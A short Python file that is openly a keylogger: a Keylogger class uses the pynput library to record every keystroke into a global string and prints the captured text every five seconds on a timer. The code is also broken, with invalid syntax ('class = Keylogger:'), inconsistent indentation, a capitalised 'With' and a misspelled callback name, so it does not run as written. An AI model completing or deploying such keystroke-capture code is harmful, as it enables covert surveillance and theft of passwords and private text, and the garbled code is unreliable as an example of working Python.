import pynput.keyboard
import threading

 log = ""

 class = Keylogger:
     def process_key_press(self, key):
         global log
         try:
             log = log + str(key.char)
         except AttributeError:
             if key == key.space:
                 log = log + " "
             else:
                 log = log + " " + str(key) + " "
    def report(self):
        global log
        print(log)
        log = " "
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.proces_key_press)
        With keyboard_listener:
            self.report()
            keyboard_listener.join()
